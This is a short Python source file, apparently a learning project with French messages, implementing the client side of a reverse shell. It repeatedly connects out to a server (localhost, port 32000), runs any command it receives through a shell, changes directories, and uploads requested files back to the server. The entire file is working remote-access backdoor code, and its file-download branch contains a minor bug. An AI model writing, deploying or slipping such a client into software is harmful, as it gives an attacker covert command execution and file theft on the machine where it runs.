""" CLIENT """
import subprocess
import platform
import socket
import time
import os

HOST_IP = "localhost"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Etablissement d'une connexion au serveur {HOST_IP}, port {HOST_PORT}...")

while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except:    
        print(f"La connexion au serveur {HOST_IP} a echouer. Nouvelle tentative...")
        time.sleep(10)
    else:
        print(f"Connecté au serveur {HOST_IP}")
        break


while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break 
    commande = commande_data.decode()
    
    repertoire = commande.split(" ")
    
    if commande == "system":
        reponse = platform.platform() + " " + os.getcwd()
        reponse = reponse.encode()
    elif len(repertoire) == 2 and repertoire[0] == "cd":
        try:
            os.chdir(repertoire[1].strip("'"))
            reponse = " "
        except FileNotFoundError:
            reponse = "Ce répertoire n'existe pas"
        reponse = reponse.encode()    
            
    elif len(repertoire) == 2 and repertoire[0] == "dl":
        try:
            f = open(repertoire[1], "rb")
        except FileNotFoundError:
            reponse = " ".encode
        else:        
            reponse = f.read()
            f.close()
                        
    else: 
        exe = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = exe.stdout + exe.stderr
        
        if not reponse or len(reponse) == 0:
            reponse = " "
        reponse = reponse.encode()
        
    data_len = len(reponse)    
    header = str(data_len).zfill(13)
    s.sendall(header.encode())
    if data_len > 0: 
        s.sendall(reponse)

s.close()    